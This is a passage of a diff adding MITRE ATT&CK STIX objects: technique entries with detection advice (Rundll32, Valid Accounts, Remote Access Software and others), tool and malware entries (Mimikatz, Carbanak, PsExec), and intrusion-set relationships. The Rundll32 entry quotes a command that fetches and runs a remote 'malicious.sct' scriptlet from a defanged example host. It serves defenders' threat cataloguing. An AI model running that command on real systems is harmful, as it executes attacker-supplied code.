+            "x_mitre_detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1036/005",
+                    "external_id": "T1036.005",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/177.html",
+                    "external_id": "CAPEC-177",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
+                    "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
+                    "source_name": "Elastic Masquerade Ball"
+                },
+                {
+                    "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
+                    "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
+                    "source_name": "Twitter ItsReallyNick Masquerading Update"
+                },
+                {
+                    "url": "https://docs.docker.com/engine/reference/commandline/images/",
+                    "description": "Docker. (n.d.). Docker Images. Retrieved April 6, 2021.",
+                    "source_name": "Docker Images"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Tool",
+            "x_mitre_data_sources": [
+                "Malware Repository: Malware Metadata"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-17T16:17:55.499Z",
+            "created": "2020-10-01T02:08:33.977Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "resource-development"
+                }
+            ],
+            "x_mitre_platforms": [
+                "PRE"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
+            "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
+            "x_mitre_contributors": [
+                "SOCCRATES",
+                "Mnemonic AS"
+            ],
+            "x_mitre_detection": "In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1588/002",
+                    "external_id": "T1588.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.recordedfuture.com/identifying-cobalt-strike-servers/",
+                    "description": "Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
+                    "source_name": "Recorded Future Beacon 2019"
+                },
+                {
+                    "url": "https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/",
+                    "description": "Maynier, E. (2020, December 20). Analyzing Cobalt Strike for Fun and Profit. Retrieved October 12, 2021.",
+                    "source_name": "Analyzing CS Dec 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Remote Access Software",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1219",
+                    "external_id": "T1219",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "Symantec Living off the Land",
+                    "description": "Wueest, C., Anand, H. (2017, July). Living off the land and fileless attack techniques. Retrieved April 10, 2018.",
+                    "url": "https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf"
+                },
+                {
+                    "source_name": "CrowdStrike 2015 Global Threat Report",
+                    "description": "CrowdStrike Intelligence. (2016). 2015 Global Threat Report. Retrieved April 11, 2018.",
+                    "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf"
+                },
+                {
+                    "source_name": "CrySyS Blog TeamSpy",
+                    "description": "CrySyS Lab. (2013, March 20). TeamSpy \u2013 Obshie manevri. Ispolzovat\u2019 tolko s razreshenija S-a. Retrieved April 11, 2018.",
+                    "url": "https://blog.crysys.hu/2013/03/teamspy/"
+                }
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Content"
+            ],
+            "x_mitre_version": "2.0",
+            "modified": "2020-06-20T20:42:37.320Z",
+            "created": "2018-04-18T17:59:24.739Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
+            "x_mitre_network_requirements": true,
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)",
+            "x_mitre_contributors": [
+                "Matt Kelly, @breakersall"
+            ],
+            "x_mitre_detection": "Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.",
+            "x_mitre_platforms": [
+                "Linux",
+                "Windows",
+                "macOS"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Rundll32",
+            "x_mitre_data_sources": [
+                "File: File Metadata",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Module: Module Load"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-10-14T21:45:53.057Z",
+            "created": "2020-01-23T18:03:46.248Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Application control",
+                "Anti-virus"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)",
+            "x_mitre_contributors": [
+                "Gareth Phillips, Seek Ltd.",
+                "Casey Smith",
+                "Ricardo Dias"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1218/011",
+                    "external_id": "T1218.011",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
+                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
+                    "source_name": "Trend Micro CPL"
+                },
+                {
+                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
+                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
+                    "source_name": "This is Security Command Line Confusion"
+                },
+                {
+                    "url": "https://www.attackify.com/blog/rundll32_execution_order/",
+                    "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
+                    "source_name": "Attackify Rundll32.exe Obscurity"
+                },
+                {
+                    "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
+                    "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
+                    "source_name": "Github NoRunDll"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Valid Accounts",
+            "x_mitre_data_sources": [
+                "Logon Session: Logon Session Metadata",
+                "User Account: User Account Authentication",
+                "Logon Session: Logon Session Creation"
+            ],
+            "x_mitre_version": "2.3",
+            "modified": "2021-10-19T03:29:48.018Z",
+            "created": "2017-05-31T21:31:00.645Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "persistence"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "privilege-escalation"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "initial-access"
+                }
+            ],
+            "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
+            "x_mitre_defense_bypassed": [
+                "Firewall",
+                "Host intrusion prevention systems",
+                "Network intrusion detection system",
+                "Application control",
+                "System access controls",
+                "Anti-virus"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "Azure AD",
+                "Office 365",
+                "SaaS",
+                "IaaS",
+                "Linux",
+                "macOS",
+                "Google Workspace",
+                "Containers"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator"
+            ],
+            "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)",
+            "x_mitre_effective_permissions": [
+                "User",
+                "Administrator"
+            ],
+            "x_mitre_contributors": [
+                "Jon Sternstein, Stern Security",
+                "Yossi Weizman, Azure Defender Research Team",
+                "Netskope",
+                "Mark Wee",
+                "Praetorian"
+            ],
+            "x_mitre_detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1078",
+                    "external_id": "T1078",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/560.html",
+                    "external_id": "CAPEC-560",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "TechNet Credential Theft",
+                    "description": "Microsoft. (2016, April 15). Attractive Accounts for Credential Theft. Retrieved June 3, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/library/dn535501.aspx"
+                },
+                {
+                    "source_name": "TechNet Audit Policy",
+                    "description": "Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved June 3, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/library/dn487457.aspx"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-26T23:15:47.861Z",
+            "name": "Bidirectional Communication",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Connection Creation"
+            ],
+            "x_mitre_version": "1.0",
+            "created": "2020-03-14T22:34:03.024Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
+            "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1102/002",
+                    "external_id": "T1102.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "malware",
+            "name": "Carbanak",
+            "x_mitre_aliases": [
+                "Carbanak",
+                "Anunak"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-04-01T16:03:31.574Z",
+            "created": "2017-05-31T21:32:22.213Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "malware--72f54d66-675d-4587-9bd3-4ed09f9522e4",
+            "description": "[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)",
+            "labels": [
+                "malware"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0030",
+                    "external_id": "S0030",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: FireEye CARBANAK June 2017)",
+                    "source_name": "Carbanak"
+                },
+                {
+                    "description": "(Citation: Fox-It Anunak Feb 2015) (Citation: FireEye CARBANAK June 2017)",
+                    "source_name": "Anunak"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf",
+                    "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018.",
+                    "source_name": "Kaspersky Carbanak"
+                },
+                {
+                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html",
+                    "description": "Bennett, J., Vengerik, B. (2017, June 12). Behind the CARBANAK Backdoor. Retrieved June 11, 2018.",
+                    "source_name": "FireEye CARBANAK June 2017"
+                },
+                {
+                    "url": "https://www.fox-it.com/en/news/blog/anunak-aka-carbanak-update/",
+                    "description": "Prins, R. (2015, February 16). Anunak (aka Carbanak) Update. Retrieved January 20, 2017.",
+                    "source_name": "Fox-It Anunak Feb 2015"
+                }
+            ]
+        },
+        {
+            "type": "tool",
+            "modified": "2021-05-20T14:25:59.596Z",
+            "name": "Mimikatz",
+            "x_mitre_aliases": [
+                "Mimikatz"
+            ],
+            "x_mitre_version": "1.4",
+            "created": "2017-05-31T21:32:11.544Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60",
+            "description": "[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Vincent Le Toux"
+            ],
+            "labels": [
+                "tool"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0002",
+                    "external_id": "S0002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://github.com/gentilkiwi/mimikatz",
+                    "description": "Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015.",
+                    "source_name": "Deply Mimikatz"
+                },
+                {
+                    "source_name": "Adsecurity Mimikatz Guide",
+                    "description": "Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.",
+                    "url": "https://adsecurity.org/?page_id=1821"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "tool",
+            "name": "netsh",
+            "x_mitre_aliases": [
+                "netsh",
+                "netsh.exe"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2020-03-31T12:41:22.189Z",
+            "created": "2017-05-31T21:33:06.083Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "tool--5a63f900-5e7e-4928-a746-dd4558e1df71",
+            "description": "[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)",
+            "labels": [
+                "tool"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0108",
+                    "external_id": "S0108",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://technet.microsoft.com/library/bb490939.aspx",
+                    "description": "Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",
+                    "source_name": "TechNet Netsh"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "tool",
+            "name": "PsExec",
+            "x_mitre_aliases": [
+                "PsExec"
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-06-24T13:47:24.660Z",
+            "created": "2017-05-31T21:32:21.771Z",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "id": "tool--ff6caf67-ea1f-4895-b80e-4bb0fc31c6db",
+            "description": "[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers. (Citation: Russinovich Sysinternals) (Citation: SANS PsExec)",
+            "x_mitre_contributors": [
+                "Janantha Marasinghe"
+            ],
+            "labels": [
+                "tool"
+            ],
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/software/S0029",
+                    "external_id": "S0029",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "Russinovich Sysinternals",
+                    "description": "Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.",
+                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx"
+                },
+                {
+                    "source_name": "SANS PsExec",
+                    "description": "Pilkington, M.. (2012, December 17). Protecting Privileged Domain Accounts: PsExec Deep-Dive. Retrieved August 17, 2016.",
+                    "url": "https://digital-forensics.sans.org/blog/2012/12/17/protecting-privileged-domain-accounts-psexec-deep-dive"
+                }
+            ]
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--674fa049-90be-45a8-94a9-cdd164cc5c6e",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--9f6aa237-6724-4991-9699-e01c7e22c8d2",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "identity--03e23f6c-0ac9-4b47-9c84-f718132adb21"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--7612170e-4090-4a4d-9554-fecf6d0eb658",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "originates-from",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--ee993c53-ddff-4d64-b3d0-fe0b0f5965e5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--e7e6345e-b1e7-4ad3-96c2-6aa7922fbca9",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--59c13dbc-0886-4a54-ad89-03f46d47f0e2"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--d1d8083c-25d1-4253-ab3d-d59f4180c045",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--db70048f-7bb6-42d7-b826-7f7422f29ce6"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--2eebcce0-fe51-45db-81bb-4c85f34f3038",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--ede470c3-431d-4ce0-9ec6-6823ceab51b4",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--0714ab22-874e-4edd-8f0a-9b94d96a5316",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--da23145d-8abe-40bf-9f8f-596562a3cb9f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--d1b25829-92ce-4cd1-8f32-5d63f7c6301a",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--e42b88c8-3e57-4ed3-9fd0-b7495ced0264",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--105e8fa0-4821-454b-b0c3-d1434304dccf"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--2698ba3a-2be4-4130-8324-7c01395d9835",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--1459143e-a354-47bc-9754-1b50f37d319a"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--9658ad0e-09ab-4274-8f37-1b0da8ae2ea9",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--55033a4d-3ffe-46b2-99b4-2c1541e9ce1c",
+            "target_ref": "location--b9235e9d-2ab7-44e4-9f80-5f31f0f5abd0"
